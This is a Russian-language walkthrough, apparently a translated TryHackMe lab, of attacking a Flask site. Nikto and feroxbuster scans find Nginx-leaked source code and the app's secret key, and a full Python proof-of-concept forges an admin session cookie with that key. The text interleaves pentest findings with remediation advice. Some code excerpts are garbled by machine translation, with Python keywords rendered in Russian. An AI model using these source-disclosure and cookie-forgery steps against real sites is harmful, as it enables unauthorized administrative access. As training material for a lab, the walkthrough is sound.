Это запустит обычное сканирование Nikto, сохраняющее данные в файле с именем «nikto», а также сканирование каталога feroxbuster с использованием 10 потоков ( -t 10), чтобы убедиться, что мы ничего не перегружаем, игнорируя самоподписанный сертификат SSL ( -k), используя список слов seclists common.txt ( -w /usr/share/seclists/Discovery/Web-Content/common.txt), проверяя три расширения ( -x py,html,txt) и сохраняя данные в выходной файл с именем «feroxbuster».

Если один из этих переключателей покажется вам странным, не волнуйтесь — так и должно быть! Мы вернемся к этому в следующем задании...

Начав сканирование, давайте продолжим и быстро посмотрим, что мы можем вручную найти в сертификате SSL, прежде чем появятся результаты сканирования.

SSL-сертификаты часто предоставляют настоящую сокровищницу информации о компании. В Firefox сертификат для сайта можно получить, нажав на замок слева от строки поиска, а затем нажав на стрелку Показать сведения о подключении, убедившись, что вы сначала деактивировали подключение Burpsuite!

Примечание: Вы можете получить ошибку о Strict Transport Security, если попытаетесь получить доступ к сайту, к которому ранее обращались с помощью Burpsuite. Это связано с сертификатом Burpsuite (signed), который позволяет браузеру принимать вышеупомянутый заголовок HSTS, что означает, что он больше не будет принимать самоподписанный сертификат. Решение этой проблемы в Firefox — открыть историю (Ctrl + H), найти домен hipper.hipflasks.thm, щелкнуть по нему правой кнопкой мыши и выбрать «Забыть об этом сайте». Вы должны иметь возможность перезагрузить страницу в обычном режиме.

Скриншот, показывающий кнопку, которую нужно нажать для просмотра сертификата сайта

Затем в открывшемся окне нажмите «Дополнительная информация», а затем «Просмотреть сертификат».

Откроется новая вкладка, содержащая информацию о сертификате для этого домена.
Скриншот, показывающий сертификат для сайта

К сожалению, здесь мало чего, чего мы уже не знаем или знали бы, если бы проследили деятельность компании.

Тем не менее, проверка SSL-сертификата — действительно полезная привычка.

Давайте вернемся назад и посмотрим на результаты наших сканирований.

Никто:

Веб-сканер Nikto довольно прост, но он часто прекрасно справляется с задачей обнаружения легкодоступных объектов:

Результаты Никто
```commandline
pentester@attacker:~$ nikto --url https://hipper.hipflasks.thm
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.11.106
+ Target Hostname:    hipper.hipflasks.thm
+ Target Port:        443
---------------------------------------------------------------------------
+ SSL Info:        Subject:  /C=GB/ST=Argyll and Bute/L=Oban/O=Hip Flasks Inc/CN=hipper.hipflasks.thm/emailAddress=webmaster@hipflasks.thm
                   Ciphers:  TLS_AES_256_GCM_SHA384
                   Issuer:   /C=GB/ST=Argyll and Bute/L=Oban/O=Hip Flasks Inc/CN=hipper.hipflasks.thm/emailAddress=webmaster@hipflasks.thm
+ Start Time:         2021-06-26 16:26:02 (GMT1)
---------------------------------------------------------------------------
+ Server: waitress
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'front-end-https' found, with contents: on
+ The site uses SSL and Expect-CT header is not present.
+ Cookie session created without the secure flag
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server banner has changed from 'waitress' to 'nginx/1.18.0 (Ubuntu)' which may suggest a WAF, load balancer or proxy is in place
+ The Content-Encoding header is set to "deflate" this may mean that the server is vulnerable to the BREACH attack.
+ Allowed HTTP Methods: HEAD, GET, OPTIONS
+ 7864 requests: 0 error(s) and 6 item(s) reported on remote host
+ End Time:           2021-06-26 16:43:48 (GMT1) (1066 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
Здесь есть немного, чтобы разбить. Во-первых, информация о сертификате выглядит хорошо — шифр актуален на момент написания, и мы уже знали остальное. Мы уже заметили отсутствие заголовка, пока ждали завершения сканирования, и определили, что в игре был обратный прокси-сервер Nginx.X-XSS-Protection

Однако создание сеансового cookie без флага Secure представляет интерес — это означает, что cookie потенциально может быть отправлен по незашифрованным HTTP- соединениям. Это то, о чем мы можем (и должны) сообщить клиенту.

Наконец, уязвимость BREACH, обнаруженная Nikto, по-видимому, является ложным срабатыванием.

`308        4l       24w      274c https://hipper.hipflasks.thm/admin
200       37l       81w      862c https://hipper.hipflasks.thm/main.py`

У нас есть раздел администратора и, судя по всему, раздел раскрытия исходного кода.

Если мы cURL-применим к этому файлу main.py, то получим приятный сюрприз:

Во-первых, мы только что установили, что это приложение написано на Flask (хотя на самом деле был способ сделать это без раскрытия исходного кода — посмотрите, сможете ли вы понять, как! Это может стать немного более очевидным в последующих задачах). Во-вторых, у нас есть секретный ключ приложения. Из-за того, как Flask создает свои сессии, это невероятно серьезная уязвимость, как вы увидите в следующих задачах...

Примечание: этот ключ генерируется автоматически при каждом запуске устройства, поэтому не беспокойтесь, если он не будет совпадать с вашим экземпляром машины.

Раскрытие исходного кода в результате неправильной настройки Nginx, включающей закрытый ключ шифрования веб-приложения, что позволяет подделывать токены.
Измените ключ шифрования как можно скорее во всех развернутых экземплярах веб-приложения и измените конфигурацию веб-сервера, чтобы предотвратить раскрытие исходного кода. В идеале исходный код веб-приложения должен быть полностью отделен от статических файлов, за пределами веб-корня Nginx. Хранение ключа в базе данных или в качестве переменной среды также будет намного безопаснее, чем хранение его в исходном коде сайта.
В этом веб-приложении есть и другие результаты; однако нашей целью является сам сервер, поэтому мы можем обсудить возможность возвращения специально для проведения пентеста веб-приложения позже.

### Ответьте на вопросы ниже
Раскройте исходный код файла main.pyи запишите секретный ключ.
```commandline
Ответ не нужен
```

## Задание 11
Критическая уязвимость, которую мы только что обнаружили, фактически позволит нам подделывать сеансы для любого 
пользователя, которого мы пожелаем, но прежде чем мы начнем ее эксплуатировать, может быть полезно коснуться того, 
как это произошло. Это также объясняет тот необычный переключатель в сканировании Feroxbuster, о котором упоминалось 
ранее.

Это задание не является обязательным для завершения комнаты, поэтому, если вам не интересно, как возникла уязвимость,
вы можете перейти к следующему заданию.

Веб-приложения традиционно следуют той же структуре, что и базовая файловая система. Например, в веб-приложении PHP 
корневой каталог веб-сервера будет содержать файл с именем index.php, и обычно несколько подкаталогов, связанных с 
различными функциями. Затем может быть подкаталог с именем about/, который также будет содержать index.php. 
Индексные файлы используются для указания содержимого по умолчанию для этого каталога, то есть если вы попытаетесь 
получить доступ к https://example.com/, то веб-сервер, скорее всего, фактически будет читать файл с именем 
/var/www/html/index.php. Доступ к https://example.com/about/, будет чтением /var/www/html/about/index.php из файловой 
системы.

Такой подход значительно упрощает жизнь нам, хакерам: если файл находится в корневом каталоге веб-сайта ( 
/var/www/htmlпо умолчанию для Apache в Linux ), то мы сможем получить к нему доступ с веб-сервера.

Современные веб-приложения часто не такие — они следуют структуре дизайна, называемой «маршрутизацией». Вместо того, 
чтобы маршруты определялись структурой файловой системы, маршруты кодируются в самом веб-приложении. Доступ 
https://example.com/about/в маршрутизируемом веб-приложении будет результатом программы, запущенной на веб-сервере 
(написанной на чем-то вроде Python — как наше целевое приложение здесь — NodeJS или Golang), которая решает, к какой 
странице вы пытаетесь получить доступ, а затем либо обслуживает статический файл, либо генерирует динамический 
результат и отображает его вам. Такой подход практически исключает возможность уязвимостей загрузки файлов, 
приводящих к удаленному выполнению кода, и означает, что мы можем получить доступ только к явно определенным 
маршрутам. Это также намного аккуратнее традиционного подхода с организационной точки зрения.

Однако маршрутизация имеет и обратную сторону. Обслуживание статического контента, такого как CSS или front-end Javascript, может быть очень утомительным, если вам нужно определить маршрут для каждой страницы. Кроме того, также относительно медленно, когда ваше веб-приложение обрабатывает статический контент для вас (хотя большинство фреймворков имеют возможность обслуживать каталог). Таким образом, очень часто веб-приложение находится за обратным прокси-сервером, таким как Nginx или Caddy. Веб-сервер обрабатывает статический контент, и любые запросы, которые не соответствуют набору правил, определенному для статического контента, перенаправляются в веб-приложение, которое затем отправляет ответ обратно через прокси-сервер пользователю.

Это означает, что поиск расширений файлов в попытке фаззинга маршрута (например, сканирование Feroxbuster, которое мы провели) на самом деле ничего не сделает с маршрутизируемым приложением, если только обратный прокси не был неправильно настроен для обслуживания большего количества статического контента, чем предполагалось. К сожалению, очень легко испортить конфигурацию обратного прокси, например, эта общая конфигурация Nginx может потенциально привести к утечке полного исходного кода веб-приложения — очень опасная перспектива:

Пример уязвимой конфигурации Nginx
```commandline
`root /var/www/webapp;
location ^~ {
    try_files $uri $uri @proxypass;
}

location @proxypass {
   //Various proxy headers
   proxy_pass http://127.0.0.1:8000;
}`
```

Эта конфигурация сначала ищет файлы в /var/www/webappи его подкаталогах. Например, если вы ищете , https://example.com/assets/css/style.cssто Nginx будет искать /var/www/webapp/assets/css/style.css. Обратите внимание, что это поведение идентично немаршрутизированному веб-приложению.

Если файл существует, то Nginx обслужит его, и запрос даже не дойдет до веб-приложения. Если файл не существует, то запрос отправляется в именованный блок расположения: proxypass, что приводит к его передаче в веб-приложение, работающее на 127.0.0.1:8000.

Это все хорошо, но что произойдет, если исходный код веб-приложения также хранится в /var/www/webapp? Запрос к /var/www/webapp/app.py, например, может привести к утечке исходного кода веб-приложения, так как Nginx увидит, что файл существует, и выдаст его как открытый текст еще до того, как запрос достигнет веб-приложения. Пример структуры приложения может выглядеть примерно так:
`/
|__app.py
|__assets/
|____css/
|________style.css
|____js/
|________scripts.js
|____app_modules/
|________database/
|____________connection.py`

Да, это приведет к тому, что Nginx будет обслуживать каталог ресурсов, но он также будет обслуживать все файлы Python.

Лучшим решением было бы использовать такую конфигурацию:

Пример безопасной конфигурации Nginx
```commandline
`root /var/www/webapp;
location ^~ /assets {
    alias /var/www/webapp/assets;
}

location / {
   //Various proxy headers
   proxy_pass http://127.0.0.1:8000;
}`
```
Это примет все запросы /assets/*и попытается обслужить статические файлы. Все остальное будет просто передано напрямую в веб-приложение.

Существует миллион и один способ достичь той же цели с помощью файлов конфигурации Nginx — многие из них будут иметь такие уязвимости, многие — нет. Все зависит от опыта системного администратора. Таким образом, поиск .py файлов с помощью feroxbuster по-прежнему является эффективной стратегией, когда мы знаем, что перед нашим веб-приложением Python есть обратный прокси-сервер — даже с маршрутизируемым приложением.
### Ответьте на вопросы ниже
Прочитайте и поймите, как критическая уязвимость, обнаруженная нами в предыдущем задании, была внедрена в приложение.
```commandline
Ответ не нужен
```

## Задание 12
Мы уже обнаружили потенциально серьезную уязвимость в этом приложении, которую мы вскоре рассмотрим для ее эксплуатации.

А пока давайте сосредоточимся на сборе дополнительной информации о приложении; использование нашего обнаруженного файла для захвата остальной части кода кажется хорошим началом. Приложения Flask работают с одним основным файлом (который у нас уже есть). Затем этот файл импортирует все остальное, что необходимо приложению для запуска — например, чертежи, которые отображают другие части приложения, модули аутентификации и т. д.

Это означает, что нам не нужно больше делать фаззинг, чтобы найти остальную часть исходного кода: мы можем просто прочитать, что main.pyимпортирует файл, и тянуть метафорическую нить, пока не загрузим все файлы. Всякий раз, когда мы находим новый файл, мы должны загрузить копию локально с помощью -o FILENAMEпереключателя curl, чтобы мы могли просмотреть исходный код подробно позже.

Давайте начнем с того, что посмотрим, что main.pyимпортирует файл:

main.py
из Flask импорт Flask, перенаправление, render_template, запрос, сессия
из datetime импорт datetime
от официантки импортировать подачу
из модулей импортировать abp
из libs.db импорт AuthConn, StatsConn
Многие из них — это просто стандартные модули Python (которые мы можем проверить, погуглив), но последние две строки относятся к пользовательским модулям.

Если вы еще не знакомы со структурами приложений Python, то очень важно отметить, что все пути к файлам указаны относительно корневого вызывающего скрипта. Другими словами, все указано относительно main.pyдля этого приложения, поэтому все скрипты в подкаталогах будут по-прежнему работать с путями к файлам относительно основного скрипта, а не самих себя.

Синтаксис здесь говорит нам о многом. Начиная с первой интересующей нас строки ( ), мы видим, что она импортирует объект с именем (который, если смотреть дальше по коду, кажется Blueprint) из файла. Это может означать одну из двух структур файлов:from modules import abpabpmodules

modules.pyВ webroot есть файл с именем .
modulesВ корневом каталоге веб-сайта есть каталог , содержащий __init__.py файл, который фактически используется для 
инициализации нового модуля внутри каталога.
Есть только один способ узнать, какой именно. Давайте попробуем оба!

Примечание: необходимо включить -k переключатель в команды cURL, чтобы игнорировать самоподписанный сертификат!

CURLing https://hipper.hipflasks.thm/modules.py выдает нам ошибку 404, поэтому должен быть второй вариант.

CURLing https://hipper.hipflasks.thm/modules/__init__.py дает нам то, что мы ищем. Файл содержит одну строку:
from modules.admin import abp

Как и ожидалось, файл init (инициализации) импортирует abpобъект Blueprint из другого файла Python в каталоге: admin.py.

CURLing https://hipper.hipflasks.thm/modules/admin.py дает нам гораздо более объемный файл:


И снова у нас есть несколько импортных товаров, которые мы можем рассмотреть:
from libs.auth import authCheck, checkAuth
from libs.db import AuthConn, StatsConn

Импорт libs.dbтакой же, как и второй импорт в main.py, но мы можем добавить libs.authв наш список вещей для проверки.

На этом этапе мы также можем обновить нашу предыдущую диаграмму:
```commandline
/
|__assets/
|____imgs/
|____fonts/
|__css/
|__js/
|__modules/
|____ __init__.py
|____admin.py
|__libs/
```

Мы знаем, что libs/подкаталог существует (он должен быть подкаталогом, если мы импортируем из него два разных модуля), но мы не знаем, являются ли два известных нам файла ( authи db) файлами или каталогами Python.

Мы можем установить это тем же способом, что и раньше — сначала проверив, libs/auth.pyсуществует ли объект, а затем, если это не удается, снова проверить, libs/auth/__init__.pyсуществует ли объект.

При попытке cURL https://hipper.hipflasks.thm/libs/auth.pyмы получаем ответ 200 и файл Python, так что это явно правильный путь. Давайте обновим карту соответствующим образом:
```commandline
/
|__assets/
|____imgs/
|____fonts/
|__css/
|__js/
|__modules/
|____ __init__.py
|____admin.py
|__libs/
|____auth.py
```

В этом файле нет никаких пользовательских импортов, но он, похоже , обрабатывает аутентификацию для сайта, так что его стоит добавить в закладки для дальнейшего прочтения!

Глядя на другой элемент в libs/подкаталоге, мы можем быстро убедиться, что это каталог, по наличию файла libs/db/__init__.py:

```commandline
libs/db/__init__.py
pentester@attacker:~$ curl https://hipper.hipflasks.thm/libs/db/__init__.py -k
---
from libs.db.base import Conn
from libs.db.auth import AuthConn
from libs.db.stats import StatsConn
```
Три импорта, то есть три файла — либо больше каталогов, либо файлов Python.

Используя тот же метод, что и раньше, мы можем легко обнаружить, что все это файлы Python, то есть наша структурная схема теперь выглядит следующим образом:
```commandline
/
|__assets/
|____imgs/
|____fonts/
|__css/
|__js/
|__modules/
|____ __init__.py
|____admin.py
|__libs/
|____auth.py
|____db/
|______base.py
|______auth.py
|______stats.py
```

Похоже, это все, что касается файлов Python; однако есть еще несколько вещей, которые мы можем заполнить.

Во-первых, из main.pyфайла мы видим, что папка шаблона приложения установлена ​​на «views»:
app.template_folder="views"

Папка templates содержит статические шаблоны HTML, которые Flask использует для создания динамических ответов. Например, в строке 24 main.pyмы можем увидеть пример функции Flask render_template, где она передает текущий год для использования в уведомлении об авторских правах в index.htmlшаблоне.

```commandline
main.py, строка 24
return render_template("index.html", year=datetime.now().date().strftime("%Y")), 200

index.html, строка 55:
<div class="container"><p class="m-0 small">Copyright &copy; Hipper Hip Flasks {{ year }}</p></div>
```
Более подробное объяснение шаблонов Flask можно найти в разделе Flask .

Независимо от этого, теперь мы можем добавить каталог "views" в нашу диаграмму. Анализ остальной части исходного кода показывает, что есть только один шаблон: который index.htmlмы уже видели.

```commandline
/
|__assets/
|____imgs/
|____fonts/
|__css/
|__js/
|__modules/
|____ __init__.py
|____admin.py
|__libs/
|____auth.py
|____db/
|______base.py
|______auth.py
|______stats.py
|__views/
|____index.html
```

Аналогично, просмотр файлов в libs/db/говорит нам, что есть каталог с именем, data/содержащий две базы данных SQLite3: users.dbи stats.db. Мы не будем слишком подробно описывать, как они раскрываются в этой задаче, поскольку они не имеют большого значения для нашего прогресса в атаке на это приложение (несмотря на то, что сами по себе представляют раскрытие информации); однако вам настоятельно рекомендуется просмотреть libs/db/base.pyисходный код, а также libs/db/auth.pyили , libs/db/stats.pyчтобы посмотреть, сможете ли вы различить это самостоятельно.

Наша окончательная структурная схема теперь выглядит так:
```commandline
/
|__assets/
|____imgs/
|____fonts/
|__css/
|__js/
|__modules/
|____ __init__.py
|____admin.py
|__libs/
|____auth.py
|____db/
|______base.py
|______auth.py
|______stats.py
|__views/
|____index.html
|__data/
|____users.db
|____stats.db
```

Что удивительно близко к реальному файловому дереву, как мы увидим, когда попадем в коробку.

Теперь, когда исходный код полностью раскрыт, давайте начнем его тщательно анализировать!

База данных SQLite3 пользователя раскрыта в https://hipper.hipflasks.thm/data/users.db. Возможность для злоумышленников загрузить базу данных и попытаться взломать пароли пользователей (включая пароли администраторов). Уязвимость немного смягчается очевидным использованием сложного пароля для пользователя-администратора.

Переместить базу данных пользователей за пределы webroot. Уязвимость также может быть смягчена как побочный эффект исправления HF-WEB-3
HF-WEB-5
Середина	5.3
База данных статистики SQLite3 оказалась уязвимой, что https://hipper.hipflasks.thm/data/stats.dbпривело к непреднамеренному раскрытию информации.
Переместите базу данных за пределы webroot. Уязвимость также может быть смягчена как побочный эффект исправления HF-WEB-3
### Ответьте на вопросы ниже
Загрузите копии всех пользовательских скриптов Python, из которых состоит приложение Flask.
```commandline
Ответ не нужен
```

## Задание 13
Теперь у нас есть локальные копии всех файлов Python, составляющих приложение, поэтому давайте их рассмотрим. Мы собираемся использовать уязвимость подделки токенов, которую мы обнаружили ранее, поэтому сейчас самое время поговорить о том, как работают сеансы Flask.

Поскольку HTTP(S) по своей сути не имеет состояния, веб-сайты хранят информацию, которая должна сохраняться между запросами, в куки-файлах — крошечных фрагментах информации, хранящихся на вашем компьютере. К сожалению, это также создает проблему: если информация хранится на вашем компьютере, что мешает вам просто редактировать ее? Когда дело доходит до сеансов, есть два основных решения.
Сеансы — это особый тип cookie-файлов, они идентифицируют вас на веб-сайте и должны быть защищены. Сеансы обычно содержат больше информации, чем просто одно значение (в отличие от стандартного cookie-файла, где может храниться только одно значение для каждого индекса). Например, если вы вошли на веб-сайт, то ваш сеанс может содержать ваш идентификатор пользователя, уровни привилегий, полное имя и т. д. Гораздо быстрее сохранить эти данные в сеансе, чем постоянно запрашивать их в базе данных!

Итак, как нам обеспечить безопасность сессий? Существует две общие школы мысли, когда речь идет о хранении сессий:

Хранилище сеансов на стороне сервера : сохраняет информацию о сеансе на сервере, но предоставляет клиенту cookie-файл для ее идентификации.
Это метод, который используют PHP и большинство других традиционных языков. Фактически, когда сеанс создается для клиента (т. е. посетителя сайта), клиенту предоставляется cookie с уникальным идентификатором, но никакая информация о сеансе фактически не передается клиенту. Вместо этого сервер хранит информацию о сеансе в локальном файле, идентифицируемом тем же уникальным идентификатором. Когда клиент делает запрос, сервер считывает идентификатор и выбирает правильный файл с диска, считывая из него информацию. Это безопасно, поскольку у клиента нет возможности редактировать фактические данные сеанса (поэтому у него нет возможности повысить свои привилегии, например).
Существуют и другие формы хранения сеансов на стороне сервера (например, хранение данных на сервере Redis или Memcached, а не на диске), но принцип всегда один и тот же.
Хранилище сеансов на стороне клиента : сохраняет всю информацию о сеансах в файлах cookie клиента, но шифрует или подписывает ее, чтобы гарантировать невозможность ее подделки.
В ситуации хранения сеанса на стороне клиента все значения сеанса хранятся непосредственно в cookie-файле — обычно в чем-то вроде J SON W eb T oken (JWT). Это метод, который использует Flask. Cookie отправляется с каждым запросом как обычно и считывается сервером, точно так же, как и любой другой cookie-файл — только с добавлением дополнительного уровня безопасности. Подписывая или шифруя cookie-файл с помощью закрытого секрета, известного только серверу, cookie-файл теоретически не может быть изменен. Flask подписывает свои cookie-файлы, что означает, что мы можем фактически декодировать их, не требуя ключа (для демонстрации попробуйте поместить ваш сеансовый cookie-файл с целевого веб-сайта в декодер base64, такой как здесь ) — мы просто не можем их редактировать ... если у нас нет ключа.
У обоих методов есть свои преимущества и недостатки. Хранилище сеансов на стороне сервера практически более безопасно и требует меньше данных, отправляемых на сервер и с него. Хранилище сеансов на стороне клиента упрощает масштабирование приложения на нескольких серверах, но ограничено 4 Кб дискового пространства, разрешенного для одного cookie. Важно, что оно также совершенно небезопасно, если раскрыт закрытый ключ. Независимо от того, подписывает ли фреймворк cookie (оставляя его в открытом виде, но проверяя его, чтобы гарантировать невозможность подделки) или полностью шифрует cookie, игра окончена, если этот закрытый ключ будет раскрыт.

Любой, у кого есть закрытый ключ веб-приложения, может создать (т. е. подделать) новые файлы cookie, которым приложение будет доверять. Если мы поймем, как работает система аутентификации, то мы сможем легко подделать себе файл cookie с любыми значениями, которые захотим, — включая назначение себя администратором или любое количество других забавных приложений.

Короче говоря, приложению, которое полагается на клиентские сеансы и имеет скомпрометированный закрытый ключ, пришел конец. Шах и мат.

Пора идти печь печенье!

### Ответьте на вопросы ниже
Поймите последствия этой уязвимости.
```commandline
Ответ не нужен
```

## Задание 14
Теперь, когда у нас есть копия исходного кода сайта, мы фактически превратили сегмент веб-приложений этой оценки в 
тест «белого ящика». Если бы это был пентест веб-приложений, мы бы прочесали исходный код в поисках уязвимостей; 
однако, в интересах краткости, мы ограничим наш обзор исключительно системой аутентификации для сайта, поскольку 
именно ее нам нужно будет обмануть с помощью нашего поддельного cookie.

Давайте начнем с рассмотрения modules/admin.py. Он содержит код, определяющий раздел администратора — если мы 
посмотрим на него, то увидим, какие меры аутентификации применяются:

модули/admin.py
```commandline
#!/usr/bin/python3
из Flask импорт Blueprint, render_template_string, запрос, перенаправление, сеанс, отмена, url_for, flash, get_flashed_messages
из libs.auth импорт authCheck, checkAuth
из libs.db импорт AuthConn, StatsConn

abp = Blueprint("abp", __name__)

@abp.route("/")
@authCheck
def manageHome():
    conn = StatsConn()
    uniqueViews = conn.getViews()
    ответ = ф"""
<!DOCTYPE html>
<html lang=en>
    <голова>
        <title>Административный раздел</title>
---
```
В самом верху файла мы находим то, что ищем. В частности, есть одна строка кода, которая обрабатывает аутентификацию для /adminмаршрута:

Это то, что называется декоратором — функция, которая оборачивает другую функцию для применения предварительной 
обработки. Это не комната программирования, и декораторы относительно сложны, поэтому мы не будем рассматривать их 
непосредственно в комнате. Тем не менее, здесь приведено объяснение с примерами , которое может быть хорошей идеей 
для ознакомления, если вы еще не знакомы с декораторами.


Коротко и ясно, вот полный объем работы обработчика аутентификации.

Если разобрать это немного подробнее, то аутентификация обрабатывается одним оператором if/else. Если checkAuth()
(лямбда-функция 1 выше) оценивается как true, то вызывается декорированная функция, что приводит к загрузке 
запрошенной страницы. Если выражение оценивается как false, то в сеанс пользователя выводится сообщение 2 , и он 
перенаправляется обратно на страницу входа. Настолько просто, насколько это возможно.

Рассмотрим лямбда-функцию checkAuth:
`checkAuth = lambda: session.get("auth") == "True"`
Мы видим, что все, что он делает, — это проверяет, есть ли у пользователя в сеансе значение «auth», которое 
необходимо установить на «True».

Его можно легко подделать, поэтому теоретически мы уже можем получить доступ к административной зоне.

Давайте посмотрим на конечную точку входа в систему modules/admin.py:

```commandline
модули/admin.py
---
@abp.route("/login", methods=["POST"])
def loginFunction():
    body = request.form
    if "username" not in body.keys() or "password" not in body.keys():
        flash("Incorrect Parameters")
        return redirect(url_for("abp.loginRoute")), 301
    conn = AuthConn()
    if conn.authenticate(body["username"], body["password"]):
        session["auth"] = "True"; session["username"] = body["username"]
        return redirect(url_for("abp.manageHome")), 301
    flash("Incorrect username or password", "error")
    return redirect(url_for("abp.loginRoute")), 301
---
```
Разбирая это, мы видим, что он ожидает пост-запрос. Затем он сохраняет отправляемую информацию в переменной с именем 
body, затем проверяет, были ли отправлены параметры usernameи password-- если они не были отправлены, он высвечивает 
сообщение Incorrect Parameters и перенаправляет их обратно на страницу входа.

Если эти параметры присутствуют , то он инициализирует соединение с базой данных пользователей и проверяет имя 
пользователя и пароль (мы не будем рассматривать код здесь ради краткости, но можете прочитать его в libs/db/auth.py)
. Если аутентификация прошла успешно, то он устанавливает два значения сеанса:
- Он устанавливает authзначение «True». Мы уже знали об этом.
- Он устанавливает usernameимя пользователя, которое мы разместили. Это будет важно позже.
- Затем он перенаправляет пользователя на домашнюю страницу управления ( /admin).

Теперь у нас есть все необходимое, так что давайте приготовим печенье!

1. Лямбда-функции являются анонимными функциями, что означает, что им не нужно давать имя или назначать их где-либо. В этом случае лямбда-функция назначается переменной ( checkAuth), а синтаксис лямбда используется лишь для большей чистоты.

2. «Мигание» — это способ Flask сохранять сообщения между запросами. Например, если вы попытаетесь войти в приложение и потерпите неудачу, то конечная точка запроса может перенаправить вас обратно на страницу входа с сообщением об ошибке. Это сообщение об ошибке будет «мигать» — то есть оно будет временно сохранено в вашем сеансе, где его может прочитать код на странице входа и отобразить вам.

### Ответьте на вопросы ниже
Прочитайте исходный код, выделенный выше. В идеале также прочитайте остальную часть кодовой базы и поймите, как все это работает.

```commandline
Ответ не нужен
```

## Задание 15
Существует множество способов подделать cookie-файл Flask, большинство из которых предполагает погружение во 
внутренние компоненты модуля Flask для непосредственного использования обработчика сеанса: очень сложное решение на 
самом деле невероятно простой проблемы.

Нам нужно сгенерировать Flask cookie. Какой способ сделать это лучше, чем с помощью приложения Flask?

Короче говоря, мы собираемся написать собственное (очень простое) приложение Flask, которое возьмет секретный ключ, 
который мы «позаимствовали», и будет использовать его для генерации подписанного сеансового cookie-файла, 
содержащего, в общем-то, все, что мы захотим.

Прежде чем начать писать, давайте создадим виртуальную среду Python для нашего проекта. Виртуальная среда (или venv) 
позволяет нам устанавливать зависимости для проекта, не рискуя сломать что-либо еще.

Убеждаемся, что у нас установлены необходимые зависимости:
`sudo apt update && sudo apt install python3-venv`

Теперь мы можем создать виртуальную среду:
`python3 -m venv poc-venv`

Это создаст подкаталог с именем, poc-venvсодержащий нашу виртуальную среду.
Мы можем активировать его с помощью команды: `source poc-venv/bin/activate`.

Это должно изменить подсказку, указывающую на то, что мы теперь находимся в виртуальной среде:

Создание виртуальной среды
`pentester@attacker:~$ python3 -m venv poc-venv
pentester@attacker:~$ source poc-venv/bin/activate
(poc-venv) pentester@attacker:~$ `
Закончив использование программы, мы можем deactivateвыйти из виртуальной среды с помощью кнопки .

Давайте начнем наш PoC с установки зависимостей:
`pip3 install flask requests waitress`

На самом деле Waitress здесь не обязателен, но его использование очень просто и делает вывод этого кода намного чище,
поэтому мы можем его добавить. 

Далее нам нужно открыть пустой текстовый документ и запустить новый скрипт Python:
`#!/usr/bin/env python3
from flask import Flask, session, request
from waitress import serve
import requests, threading, time`

Это дает нам скрипт Python с различными модулями. У нас есть все, что нужно для настройки приложения Flask через 
модули flask и waitress; затем у нас также есть запросы, потоки и время, которые мы будем использовать для 
автоматического запроса сервера, который мы настраиваем.

Разобравшись с импортом, давайте инициализируем приложение:
`app = Flask(__name__)
app.config["SECRET_KEY"] = "PUT_THE_KEY_HERE"`

Это создает новый объект приложения Flask и настраивает секретный ключ. Очевидно, вам придется заменить ключ, 
который вы нашли ранее в раскрытом main.py файле, заменив текст "PUT_THE_KEY_HERE".

Далее давайте настроим webroot, который установит два значения сеанса, которые мы определили ранее:
`@app.route("/")
def main():
    session["auth"] = "True"
    session["username"] = "Pentester"
    return "Check your cookies", 200`

Теперь наше приложение готово к работе, нам осталось только запустить его и отправить запрос.

Технически мы могли бы просто запустить приложение здесь и перейти к нему в нашем браузере, но это было бы скучно. 
Давайте сделаем все это из командной строки.

Если мы делаем две вещи одновременно (запускаем приложение, а затем отправляем ему запрос), нам нужно будет 
использовать потоки, поэтому наши следующие строки кода будут такими: Это создает поток и дает ему задачу запустить 
waitress, используя наш объект app на. Затем он сообщает потоку о необходимости демонизироваться, то есть это не 
помешает программе завершить работу (т. е. если программа завершается, то сервер также остановится, но программа не 
будет ждать остановки сервера перед завершением работы). Наконец, мы запускаем поток, заставляя сервер работать в 
фоновом режиме.

`thread = threading.Thread(target = lambda: serve(app, port=9000, host="127.0.0.1"))
thread.setDaemon(True)
thread.start()

localhost:9000`

Последнее, что нам нужно, чтобы эта программа сделала, — запросила сервер:
`time.sleep(1)
print(requests.get("http://localhost:9000/").cookies.get("session"))`

Это будет ждать одну секунду, чтобы дать waitress достаточно времени для запуска сервера, затем он запросит конечную 
точку, которую мы настроили, заставив Flask сгенерировать и предоставить нам cookie, который программа затем 
распечатает. Затем программа завершается, автоматически останавливая сервер.

Теперь мы готовы к работе!

Окончательная программа должна выглядеть так, хотя в нее следует вставить ваш собственный ключ:

Полная программа
```commandline
#!/usr/bin/env python3
from flask import Flask, session, request
from waitress import serve
import requests, threading, time

#Flask Initialisation
app = Flask(__name__)
app.config["SECRET_KEY"] = "70a5411082ea8e48cc9e7f7d7c12f2c2"

@app.route("/")
def main():
    session["auth"] = "True"
    session["username"] = "Pentester"
    return "Check your cookies", 200

#Flask setup/start
thread = threading.Thread(target = lambda: serve(app, port=9000, host="127.0.0.1"))
thread.setDaemon(True)
thread.start()

#Request
time.sleep(1)
print(requests.get("http://localhost:9000/").cookies.get("session"))
```
Запуск программы должен выдать нам cookie-файл, подписанный сервером с использованием нашего украденного ключа:
Демонстрация PoC-кода

При каждом запуске программы результат будет разным.

Теперь давайте закончим это. Скопируйте сгенерированный файл cookie, откройте браузерные инструменты разработчика на 
сайте и перезапишите значение текущего сеансового файла cookie. Это также можно сделать с помощью расширения 
браузера, например, Cookie-Editor.

Теперь мы можем получить доступ к https://hipper.hipflasks.thm/admin:

### Ответьте на вопросы ниже
Получите доступ к консоли администратора!
```commandline
Ответ не нужен
```
## Задание 16
Мы получили доступ к консоли администратора, но, похоже, ничего не получили, сделав это. Все, что у нас есть, это счетчик статистики (который у нас уже был после загрузки БД).

Так зачем же нам понадобилось проходить через всю эту канитель, если консоль администратора на самом деле не дает нам никаких дополнительных полномочий над веб-приложением?

Если вы уже взламывали приложения Flask, вы, возможно, уже знаете ответ на этот вопрос, прочитав исходный код приложения. В admin.pyмодуле есть серьезная уязвимость — та, к которой (в данном случае) можно получить доступ только после входа в систему.

Когда вы вошли на страницу администратора, вы заметили, что она отобразила вам поддельное имя пользователя?
Изображение, на котором имя пользователя отображается на странице администратора

Это указывает на то, что в фоновом режиме происходит некая форма редактирования шаблона — другими словами, веб-приложение берет заранее написанный шаблон и вводит в него значения. Существуют безопасные способы сделать это, а есть... менее безопасные способы сделать это.

